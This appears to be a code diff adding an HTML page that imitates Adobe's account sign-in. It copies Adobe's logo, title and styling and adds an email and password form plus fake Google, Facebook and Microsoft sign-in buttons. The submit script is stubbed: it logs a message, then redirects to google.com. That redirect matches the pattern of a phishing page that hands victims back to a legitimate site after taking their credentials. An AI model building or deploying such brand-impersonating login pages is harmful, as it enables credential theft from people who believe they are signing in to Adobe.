@@ -1,0 +1,307 @@
+<html><head><base href="">
+<title>Adobe Account | Sign In</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  body, html {
+    margin: 0;
+    padding: 0;
+    font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    height: 100%;
+    font-size: 16px;
+  }
+  .container {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    background-image: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80');
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+  }
+  header {
+    background-color: rgba(255, 255, 255, 0.9);
+    padding: 1rem 0;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  }
+  .header-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 1.5rem;
+  }
+  .adobe-logo {
+    width: 1.875rem;
+    height: 1.625rem;
+  }
+  main {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 2.5rem 1.5rem;
+    position: relative;
+  }
+  .background-image {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-size: cover;
+    background-position: center;
+    filter: blur(5px);
+    z-index: -1;
+  }
+  .login-card {
+    background-color: rgba(255, 255, 255, 0.9);
+    border-radius: 0.25rem;
+    box-shadow: 0 2px 14px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 25rem;
+    padding: 3rem;
+    backdrop-filter: blur(10px);
+    z-index: 1;
+  }
+  h1 {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #2c2c2c;
+    margin-bottom: 2rem;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  .form-group {
+    margin-bottom: 1.5rem;
+  }
+  label {
+    display: block;
+    font-size: 0.875rem;
+    font-weight: 700;
+    color: #4b4b4b;
+    margin-bottom: 0.5rem;
+  }
+  input {
+    width: 100%;
+    padding: 0.5rem 0.75rem;
+    font-size: 1rem;
+    border: 1px solid #b3b3b3;
+    border-radius: 0.25rem;
+    transition: border-color 0.2s;
+  }
+  input:focus {
+    outline: none;
+    border-color: #1473e6;
+  }
+  button {
+    background-color: #1473e6;
+    color: #fff;
+    font-size: 1rem;
+    font-weight: 700;
+    padding: 0.75rem;
+    border: none;
+    border-radius: 0.25rem;
+    cursor: pointer;
+    transition: background-color 0.2s;
+  }
+  button:hover {
+    background-color: #0d66d0;
+  }
+  .links {
+    margin-top: 1.5rem;
+    text-align: center;
+    font-size: 0.875rem;
+  }
+  .links a {
+    color: #1473e6;
+    text-decoration: none;
+  }
+  .links a:hover {
+    text-decoration: underline;
+  }
+  footer {
+    background-color: rgba(250, 250, 250, 0.9);
+    padding: 1.5rem 0;
+    font-size: 0.75rem;
+    color: #656565;
+  }
+  .footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 1.5rem;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+  }
+  .footer-links a {
+    color: #656565;
+    text-decoration: none;
+    margin-left: 1rem;
+  }
+  .footer-links a:hover {
+    text-decoration: underline;
+  }
+
+  /* New styles for alternative sign-in buttons */
+  .alternative-signin {
+    margin-top: 2rem;
+    text-align: center;
+  }
+  .alternative-signin p {
+    font-size: 0.875rem;
+    color: #4b4b4b;
+    margin-bottom: 1rem;
+  }
+  .alternative-signin-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 1rem;
+  }
+  .alternative-signin-button {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 40px;
+    height: 40px;
+    border: 1px solid #b3b3b3;
+    border-radius: 50%;
+    transition: background-color 0.2s;
+  }
+  .alternative-signin-button:hover {
+    background-color: #f0f0f0;
+  }
+  .alternative-signin-button img {
+    width: 20px;
+    height: 20px;
+  }
+
+  @media (max-width: 768px) {
+    .login-card {
+      padding: 2rem;
+    }
+    h1 {
+      font-size: 1.25rem;
+    }
+    .footer-content {
+      flex-direction: column;
+      align-items: center;
+    }
+    .footer-links {
+      margin-top: 1rem;
+    }
+    .footer-links a {
+      margin: 0 0.5rem;
+    }
+  }
+
+  @media (max-width: 480px) {
+    .login-card {
+      padding: 1.5rem;
+    }
+    main {
+      padding: 1.5rem 1rem;
+    }
+    .footer-content {
+      text-align: center;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="header-content">
+        <svg class="adobe-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26">
+          <path fill="#FA0F00" d="M19,0h11v26L19,0z M11,0H0v26L11,0z M15,8.4L22.8,26h-5.3l-2.4-5.9h-5.8L15,8.4z"/>
+        </svg>
+      </div>
+    </header>
+
+    <main>
+      <div class="background-image"></div>
+      <div class="login-card">
+        <h1>Sign in to your account</h1>
+        <form action="process_form.php" method="POST">
+          <div class="form-group">
+            <label for="email">Email address</label>
+            <input type="email" id="email" name="email" required>
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+          </div>
+          <button type="submit">Continue</button>
+        </form>
+        <div class="links">
+          <a href="#/forgot-password">Forgot password?</a>
+          <br><br>
+          <a href="#/create-account">Get an Adobe ID</a>
+        </div>
+        <div class="alternative-signin">
+          <p>Or sign in with</p>
+          <div class="alternative-signin-buttons">
+            <a href="#/auth/google" class="alternative-signin-button" title="Sign in with Google">
+              <img src="https://img.icons8.com/color/48/000000/google-logo.png" alt="Google logo">
+            </a>
+            <a href="#/auth/facebook" class="alternative-signin-button" title="Sign in with Facebook">
+              <img src="https://img.icons8.com/color/48/000000/facebook-new.png" alt="Facebook logo">
+            </a>
+            <a href="#/auth/microsoft" class="alternative-signin-button" title="Sign in with Microsoft">
+              <img src="https://img.icons8.com/color/48/000000/microsoft.png" alt="Microsoft logo">
+            </a>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer>
+      <div class="footer-content">
+        <div>&copy; 2023 Adobe-alike. All rights reserved.</div>
+        <div class="footer-links">
+          <a href="#/privacy">Privacy</a>
+          <a href="#/terms">Terms of Use</a>
+          <a href="#/cookies">Cookies</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      if (email && password) {
+        console.log('Login attempt registered. In a real scenario, this would be processed securely.');
+        // Simulating a redirect after successful login
+        window.location.href = 'https://google.com';
+      } else {
+        alert('Please enter both email and password.');
+      }
+    });
+
+    // Function to adjust layout for different screen sizes
+    function adjustLayout() {
+      const container = document.querySelector('.container');
+      if (window.innerWidth <= 768) {
+        container.style.backgroundAttachment = 'scroll';
+      } else {
+        container.style.backgroundAttachment = 'fixed';
+      }
+    }
+
+    // Call adjustLayout on page load and window resize
+    window.addEventListener('load', adjustLayout);
+    window.addEventListener('resize', adjustLayout);
+
+    // Add click event listeners for alternative sign-in buttons
+    document.querySelectorAll('.alternative-signin-button').forEach(button => {
+      button.addEventListener('click', function(e) {
+        e.preventDefault();
+        const provider = this.getAttribute('href').split('/').pop();
+        console.log(`Attempting to sign in with ${provider}. In a real scenario, this would redirect to the ${provider} authentication page.`);
+      });
+    });
+  </script>
+</body></html>
